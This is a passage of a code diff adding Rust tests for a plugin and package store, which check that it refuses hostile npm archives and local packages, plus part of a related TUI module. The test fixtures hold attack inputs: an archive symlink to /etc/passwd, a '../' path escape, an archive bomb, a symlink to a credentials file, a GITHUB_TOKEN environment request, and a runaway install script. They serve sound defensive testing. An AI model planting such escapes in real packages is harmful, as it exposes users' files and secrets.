++    publish(&origin, &routes, &[("1.0.0", honest.clone())]);
++    let mut pinned = npm_request(&origin, "1.0.0", &["commands"]);
++    let plan = store.package_plan(pinned.clone()).unwrap();
++    pinned.source = plan.packages[0].source.clone();
++
++    routes
++        .lock()
++        .unwrap()
++        .insert("/tarballs/omd-npm-1.0.0.tgz".into(), npm_archive("1.0.0", &["commands", "exec"]));
++    assert!(refusal(&store, npm_request(&origin, "1.0.0", &["commands"])).contains("npm_tarball_integrity_failure"));
++
++    publish(&origin, &routes, &[("1.0.0", npm_archive("1.0.0", &["commands", "exec"]))]);
++    assert!(refusal(&store, pinned).contains("npm_integrity_changed"));
++    assert!(
++        refusal(&store, npm_request(&origin, "1.0.0", &["commands"]))
++            .contains("explicit_exact_capability_grant_required"),
++        "a republished permission change needs a new grant"
++    );
++
++    let mut files = npm_mod("1.0.0", &["commands"]);
++    let entries = |files: &[(String, Vec<u8>)], extra: &[(&str, u8, &[u8])]| {
++        let mut entries = files
++            .iter()
++            .map(|(name, data)| (name.as_str(), b'0', data.as_slice()))
++            .collect::<Vec<_>>();
++        entries.extend_from_slice(extra);
++        publish(&origin, &routes, &[("1.0.0", tarball(&entries))]);
++        refusal(&store, npm_request(&origin, "1.0.0", &["commands"]))
++    };
++    assert!(entries(&files, &[("package/escape.ts", b'2', b"/etc/passwd")]).contains("npm_archive_link_rejected"));
++    assert!(entries(&files, &[("package/../escape.ts", b'0', b"x")]).contains("npm_archive_path_rejected"));
++    let bomb = vec![0; 17 * 1024 * 1024];
++    assert!(entries(&files, &[("package/bomb.ts", b'0', &bomb)]).contains("npm_archive_invalid: larger than"));
++    let mut seed = 1u64;
++    let noise = (0..5 * 1024 * 1024)
++        .map(|_| {
++            seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
++            (seed >> 56) as u8
++        })
++        .collect::<Vec<_>>();
++    assert!(entries(&files, &[("package/noise.ts", b'0', &noise)]).contains("npm_fetch_failed: larger than"));
++    files[0].1 = serde_json::to_vec(&json!({"name":"@fixture/omd-npm","version":"1.0.0",
++        "dependencies":{"left-pad":"1.3.0"}}))
++    .unwrap();
++    assert!(entries(&files, &[]).contains("npm_runtime_dependencies_unsupported"));
++    files[0].1 = serde_json::to_vec(&json!({"name":"@fixture/other","version":"1.0.0"})).unwrap();
++    assert!(entries(&files, &[]).contains("npm_package_identity_mismatch"));
++    let without_manifest = npm_mod("1.0.0", &["commands"])
++        .into_iter()
++        .filter(|(name, _)| name != "package/mod.json")
++        .collect::<Vec<_>>();
++    assert!(entries(&without_manifest, &[]).contains("npm_mod_manifest_missing"));
++
++    for (package, registry) in [
++        ("../omd", origin.as_str()),
++        ("@fixture/omd-npm", "http://registry.example.com"),
++        ("@fixture/omd-npm", "file:///etc"),
++    ] {
++        let mut request = npm_request(registry, "1.0.0", &["commands"]);
++        request.source = ModPackageSource::Npm {
++            package: package.into(),
++            version: "1.0.0".into(),
++            registry: registry.into(),
++            integrity: String::new(),
++        };
++        assert!(refusal(&store, request).contains("npm_reference_invalid"));
++    }
++    assert!(
++        std::fs::read_dir(temp.path().join("store"))
++            .unwrap()
++            .all(|entry| !entry.unwrap().file_name().to_string_lossy().ends_with(".tmp")),
++        "refused archives leave no staging directory"
++    );
++}
++
++#[test]
++fn adversarial_local_packages_cannot_escape_escalate_or_forge_approval() {
++    let temp = TempDir::new().unwrap();
++    let root = temp.path().canonicalize().unwrap();
++    let store = store_with_node(&temp);
++    let package = mod_package(&root, "hostile", "1.0.0", &["commands"], json!([]));
++    let manifest = |change: &dyn Fn(&mut serde_json::Value)| {
++        let mut value: serde_json::Value =
++            serde_json::from_slice(&std::fs::read(package.join("mod.json")).unwrap()).unwrap();
++        change(&mut value);
++        std::fs::write(package.join("mod.json"), serde_json::to_vec(&value).unwrap()).unwrap();
++    };
++
++    let outside = root.join("outside");
++    std::fs::create_dir(&outside).unwrap();
++    std::fs::write(outside.join("credentials.json"), b"{\"token\":\"secret\"}").unwrap();
++    std::os::unix::fs::symlink(&outside, package.join("lib")).unwrap();
++    manifest(&|value| value["assets"] = json!(["lib/credentials.json"]));
++    assert!(refusal(&store, request(&package, &["commands"])).contains("package_path_escape"));
++    manifest(&|value| value["assets"] = json!([]));
++    std::fs::remove_file(package.join("main.ts")).unwrap();
++    std::os::unix::fs::symlink(outside.join("credentials.json"), package.join("main.ts")).unwrap();
++    assert!(store.package_plan(request(&package, &["commands"])).is_err());
++    std::fs::remove_file(package.join("main.ts")).unwrap();
++    std::fs::write(package.join("main.ts"), "export default () => {}\n").unwrap();
++
++    manifest(&|value| {
++        value["exec_environment"] = json!(["GITHUB_TOKEN"]);
++        value["capabilities"] = json!(["commands", "exec"]);
++    });
++    assert!(
++        refusal(&store, request(&package, &["commands", "exec"]))
++            .contains("secret_environment_requires_explicit_trust: hostile GITHUB_TOKEN")
++    );
++    manifest(&|value| {
++        value["exec_environment"] = json!([]);
++        value["capabilities"] = json!(["commands"]);
++        value["entrypoint"] = json!("big.ts");
++    });
++    std::fs::write(package.join("big.ts"), vec![b'/'; 65_537]).unwrap();
++    assert!(refusal(&store, request(&package, &["commands"])).contains("file_limit"));
++    manifest(&|value| {
++        value["entrypoint"] = json!("main.ts");
++        value["lifecycle"] = json!({"install":"install.ts"});
++    });
++    std::fs::write(package.join("install.ts"), "export default () => { for (;;) {} }\n").unwrap();
++    let mut looping = request(&package, &["commands"]);
++    looping.trust.packages.get_mut("hostile").unwrap().lifecycle = vec!["install".into()];
++    let plan = store.package_plan(looping.clone()).unwrap();
++    assert!(store.package_apply(looping, &plan.confirmation).is_err());
++    assert!(store.package_lock().unwrap().packages.is_empty(), "a runaway script installs nothing");
++    manifest(&|value| value["lifecycle"] = json!({}));
++
++    let install = request(&package, &["commands"]);
++    let plan = store.package_plan(install.clone()).unwrap();
++    assert!(
++        store
++            .package_apply(install.clone(), &"0".repeat(64))
++            .unwrap_err()
++            .to_string()
++            .contains("package_plan_changed"),
++        "a forged confirmation is refused"
++    );
++    std::fs::write(package.join("main.ts"), "export default () => { /* swapped */ }\n").unwrap();
++    assert!(
++        store
++            .package_apply(install.clone(), &plan.confirmation)
++            .unwrap_err()
++            .to_string()
++            .contains("package_plan_changed"),
++        "content changed after review is refused"
++    );
++    let plan = store.package_plan(install.clone()).unwrap();
++    store.package_apply(install, &plan.confirmation).unwrap();
++    store.package_enable("hostile").unwrap();
++    assert!(
++        store
++            .trust(package.clone(), &"0".repeat(64), vec!["commands".into()], "user")
++            .unwrap_err()
++            .to_string()
++            .contains("trust_digest_mismatch")
++    );
++
++    manifest(&|value| {
++        value["version"] = json!("1.1.0");
++        value["capabilities"] = json!(["commands", "exec"]);
++    });
++    assert!(refusal(&store, request(&package, &["commands"])).contains("explicit_exact_capability_grant_required"));
++    let escalation = request(&package, &["commands", "exec"]);
++    let plan = store.package_plan(escalation.clone()).unwrap();
++    assert_eq!(plan.changes["packages"][0]["renewed_approval"], true);
++    assert_eq!(plan.changes["packages"][0]["grant"]["from"]["capabilities"], json!(["commands"]));
++    let lock = store.package_apply(escalation, &plan.confirmation).unwrap();
++    assert!(!lock.packages["hostile"].enabled, "new authority is never enabled by an update");
++
++    let cache = lock.history["hostile"][0].cache_path.clone();
++    std::fs::write(cache.join("main.ts"), "export default () => { /* tampered */ }\n").unwrap();
++    let rollback = store.package_rollback_plan("hostile").unwrap();
++    assert!(
++        store
++            .package_rollback("hostile", &rollback.confirmation)
++            .unwrap_err()
++            .to_string()
++            .contains("cached_package_integrity_failure")
++    );
++
++    store.package_quarantine("hostile", "exfiltrates tokens").unwrap();
++    assert!(store.package_enable("hostile").unwrap_err().to_string().contains("package_blocked"));
++    assert!(refusal(&store, request(&package, &["commands", "exec"])).contains("package_blocked: hostile 1.1.0: exfiltrates tokens"));
++    assert!(store.package_quarantine("hostile", "two\nlines").is_err());
++    let blocked = store.package_lock().unwrap();
++    assert!(!blocked.packages["hostile"].enabled);
++    assert!(root.join("hostile/main.ts").exists(), "quarantine keeps user data and sources");
++    store.package_unblock("hostile").unwrap();
++    store.package_enable("hostile").unwrap();
++
++    store.revoke("hostile").unwrap();
++    let lock = store.package_lock().unwrap();
++    assert!(!lock.packages["hostile"].enabled && lock.packages["hostile"].trust.capabilities.is_empty());
++    assert!(store.package_enable("hostile").unwrap_err().to_string().contains("capability_denied"));
++    let uninstall = store.package_uninstall_plan("hostile").unwrap();
++    store.package_uninstall("hostile", &uninstall.confirmation).unwrap();
++
++    let leaked = ModInstallRequest {
++        source: ModPackageSource::Repository {
++            repository: "https://user:ghp_secret@example.invalid/mod.git?token=abc".into(),
++            revision: "main".into(),
++            subdirectory: String::new(),
++        },
++        offline: true,
++        ..request(&package, &["commands"])
++    };
++    assert!(store.package_apply(leaked, "x").is_err());
++    let events = store.security_events().unwrap();
++    let kinds = events.iter().map(|event| event["event"].as_str().unwrap()).collect::<Vec<_>>();
++    for kind in ["install", "enable", "update", "quarantine", "unblock", "revoke", "uninstall", "package_refused"] {
++        assert!(kinds.contains(&kind), "{kind} missing from {kinds:?}");
++    }
++    let text = serde_json::to_string(&events).unwrap();
++    assert!(!text.contains("ghp_secret") && !text.contains("token=abc"));
++    assert!(text.contains("https://example.invalid/mod.git"));
++}
++
++#[test]
++fn private_npm_registries_use_npmrc_and_an_unreadable_lock_is_recoverable() {
++    let temp = TempDir::new().unwrap();
++    let root = temp.path().canonicalize().unwrap();
++    let store = store(&temp);
++    let (origin, routes) = registry();
++    publish(&origin, &routes, &[("1.0.0", npm_archive("1.0.0", &["commands"]))]);
++    routes.lock().unwrap().insert("!token".into(), b"s3cret".to_vec());
++    let npmrc = root.join("npmrc");
++    std::fs::write(
++        &npmrc,
++        format!(
++            "registry=https://registry.example.invalid/\n@fixture:registry={origin}/\n{}/:_authToken=${{OMD_TEST_NPM_TOKEN}}\n",
++            origin.trim_start_matches("http:")
++        ),
++    )
++    .unwrap();
++    let omd = |args: &[&str], token: &str| {
++        let output = Command::new(env!("CARGO_BIN_EXE_omd"))
++            .args(args)
++            .env(codex_omd::MOD_STORE_ENV, root.join("store"))
++            .env("NPM_CONFIG_USERCONFIG", &npmrc)
++            .env("OMD_TEST_NPM_TOKEN", token)
++            .stdin(std::process::Stdio::null())
++            .output()
++            .unwrap();
++        (
++            output.status.code().unwrap(),
++            String::from_utf8_lossy(&output.stdout).into_owned()
++                + &String::from_utf8_lossy(&output.stderr),
++        )
++    };
++    let (code, output) = omd(&["install", "npm:@fixture/omd-npm@1.0.0", "--yes"], "wrong");
++    assert!(code == 1 && output.contains("npm_fetch_failed") && output.contains("401"), "{output}");
++    let (code, output) = omd(&["install", "npm:@fixture/omd-npm@1.0.0", "--yes"], "s3cret");
++    assert_eq!(code, 0, "{output}");
++    let lock = store.package_lock().unwrap();
++    assert!(matches!(&lock.packages["npm_mod"].source, ModPackageSource::Npm { registry, .. } if registry == &origin));
++    assert!(!serde_json::to_string(&store.security_events().unwrap()).unwrap().contains("s3cret"));
++
++    std::fs::write(root.join("store/packages.lock.json"), br#"{"schema":1,"revision":1,"packages":{"npm_mod":{}}}"#).unwrap();
++    let (code, output) = omd(&["mods", "list"], "");
++    assert!(code == 1 && output.contains("package_lock_unreadable") && output.contains("omd mods reset-lock"), "{output}");
++    assert_eq!(omd(&["mods", "revoke", "npm_mod"], "").0, 0, "revoke works without a readable lock");
++    let (code, output) = omd(&["mods", "reset-lock"], "");
++    assert!(code == 0 && output.contains("packages.lock.json.corrupt"), "{output}");
++    let (code, output) = omd(&["mods", "list"], "");
++    assert!(code == 0 && output.contains("npm_mod 1.0.0 user off (selection)"), "{output}");
 +}
 diff --git a/codex-rs/omd/tests/review_bridge.rs b/codex-rs/omd/tests/review_bridge.rs
 new file mode 100644
@@ -98212,10 +100137,10 @@ index 000000000..87d85669a
 +}
 diff --git a/codex-rs/tui/src/mod_surface.rs b/codex-rs/tui/src/mod_surface.rs
 new file mode 100644
-index 000000000..ff02a4263
+index 000000000..73f479b93
 --- /dev/null
 +++ b/codex-rs/tui/src/mod_surface.rs
-@@ -0,0 +1,829 @@
+@@ -0,0 +1,830 @@
 +use crate::app_event::AppEvent;
 +use crate::app_event_sender::AppEventSender;
 +use codex_omd::app_routes::NotificationQueue;
@@ -99024,12 +100949,13 @@ index 000000000..ff02a4263
 +            crate::mod_runtime::write_settings(&store, id, &call.arguments["values"], caller)
 +        }
 +        "settings.write" => Err(other("host_operation_user_only: settings.write")),
-+        "packages.list" | "packages.preview" | "packages.reload" => {
++        "packages.list" | "packages.index" | "packages.preview" | "packages.reload" => {
 +            let store = codex_omd::ModStore::open(store(paths)?)?;
 +            match operation {
 +                "packages.list" => {
 +                    codex_omd::package_controls::list(&store, crate::omd::mod_status().as_ref())
 +                }
++                "packages.index" => codex_omd::package_controls::index(&store, call.arguments),
 +                "packages.preview" => codex_omd::package_controls::preview(&store, call.arguments)
 +                    .map(|preview| preview.public),
 +                _ if context == codex_omd::app_routes::InvocationContext::User => {
